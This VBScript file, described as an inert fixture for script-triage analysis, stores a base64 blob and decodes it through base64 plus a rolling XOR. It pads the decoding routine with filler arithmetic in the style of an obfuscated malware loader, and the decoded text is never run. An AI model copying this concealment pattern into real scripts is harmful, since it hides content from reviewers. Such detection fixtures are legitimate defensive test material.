Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_90261c00 = "7tPinu2Z/Iz/wqPAscSt37rll/Kf8IThzanAs8Oi1rXdgu+K54j6g/+e+pvrn/qIteKL5a3Zrd3zpM2j65/rm8ms3ajNvsrk0f/OssG11LPWieqF8J7q1+WZ+pv2hueO6YfYsdXoi+qH95b/mPbb4oC31OXS5dTn16verMD9leGV5Zasg6yV98CjkqWSo5CgjuuT8p/vg+bIoc+52LTduZb1x/WRpJH1zeOH5pLum+iN/6DBpsOt2eSs2bfDsdSn1Jj5m7SN79i7ir2Ku4i4"
Const Codec_90261c00 = "base64_chunks|rolling_xor|98"

Function Base64_90261c00(ByVal encodedText)
  Dim alphabet, cleanText, characterIndex, encodedCharacter, characterValue
  Dim outputBytes(), outputIndex, accumulator, bitCount
  alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  cleanText = Replace(Replace(encodedText, vbCr, ""), vbLf, "")
  ReDim outputBytes((Len(cleanText) * 3) \ 4)
  outputIndex = 0
  accumulator = 0
  bitCount = 0
  For characterIndex = 1 To Len(cleanText)
    encodedCharacter = Mid(cleanText, characterIndex, 1)
    If encodedCharacter <> "=" Then
      characterValue = InStr(1, alphabet, encodedCharacter, vbBinaryCompare) - 1
      If characterValue < 0 Then Err.Raise 5, "Base64_90261c00", "Invalid Base64 character"
      accumulator = (accumulator * 64) + characterValue
      bitCount = bitCount + 6
    End If
    If bitCount >= 8 Then
      bitCount = bitCount - 8
      outputBytes(outputIndex) = (accumulator \ (2 ^ bitCount)) And 255
      outputIndex = outputIndex + 1
      If bitCount = 0 Then
        accumulator = 0
      Else
        accumulator = accumulator And ((2 ^ bitCount) - 1)
      End If
    End If
  Next
  ReDim Preserve outputBytes(outputIndex - 1)
  Base64_90261c00 = outputBytes
End Function

Function Load_90261c00()
  Dim partWidth, packedText
  partWidth = (Len(Material_90261c00) + 3) \ 4
  packedText = Mid(Material_90261c00, 1, partWidth) & Mid(Material_90261c00, partWidth + 1, partWidth) & Mid(Material_90261c00, partWidth * 2 + 1, partWidth) & Mid(Material_90261c00, partWidth * 3 + 1)
  Load_90261c00 = Base64_90261c00(packedText)
End Function

Function Decode_90261c00(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  previous = 152
  For i = 0 To UBound(s)
    result(i) = s(i) Xor previous
    previous = s(i)
  Next
  Decode_90261c00 = result
End Function

Function Recover_90261c00()
  Dim s, d, t, n, i, p, e, q
  ' configuration reconstruction
n = (19 * 7) - 133
  s = Load_90261c00()
  p = 0
  While p < 1
    d = Decode_90261c00(s)
    p = p + 1
  Wend
  t = ""
  For i = 0 To UBound(d)
    t = t & Chr(d(i))
  Next
' reconstruction complete
  Recover_90261c00 = t
End Function

Function Inspect_90261c00()
  Inspect_90261c00 = Recover_90261c00()
End Function
